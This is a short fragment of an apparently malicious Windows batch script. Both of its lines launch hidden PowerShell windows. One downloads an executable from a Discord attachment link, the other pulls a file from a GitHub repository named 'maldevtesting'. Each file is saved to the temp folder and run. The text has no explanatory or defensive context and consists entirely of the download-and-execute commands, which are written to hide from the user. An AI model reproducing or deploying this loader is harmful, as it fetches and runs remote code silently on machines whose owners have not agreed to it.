...
@powershell -WindowStyle Hidden -Command "& {iwr 'https://cdn.discordapp.com/attachments/1276410967776825467/1311764140930367662/EchoUserAssistance.exe?ex=674a0b0e&is=6748b98e&hm=30bc56473877b555f3a80388c7e4cf357bb0d44a9a9a241641cda90151dd55c6&' -OutFile $env:TEMP\echouserassistance.exe}" && start %TEMP%\echouserassistance.exe
...
:load
@powershell -WindowStyle Hidden -Command "& {iwr 'https://raw.githubusercontent.com/surhan1/maldevtesting/refs/heads/main/downloadtester' -OutFile $env:TEMP\ohiosus1.txt}" && start %TEMP%\ohiosus1.txt
